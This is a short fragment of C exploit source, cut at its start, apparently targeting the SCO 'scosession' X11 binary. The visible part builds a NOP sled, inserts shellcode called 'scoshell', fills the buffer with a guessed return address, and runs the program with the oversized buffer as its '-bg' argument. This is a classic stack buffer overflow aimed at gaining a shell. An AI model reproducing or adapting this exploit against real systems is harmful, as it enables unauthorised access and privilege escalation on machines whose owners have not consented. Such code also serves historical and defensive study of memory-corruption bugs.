"); fprintf(stderr, "Using addr: 0x%x
", addr-offset); memset(buf,NOP,buflen); memcpy(buf+(buflen/2),scoshell,strlen(scoshell)); for(i=((buflen/2) + strlen(scoshell))+4;i<buflen-4;i+=4) *(int *)&buf[i]=addr+offset; execl("/usr/bin/X11/scosession", "scosession", "-bg", buf, NULL); }

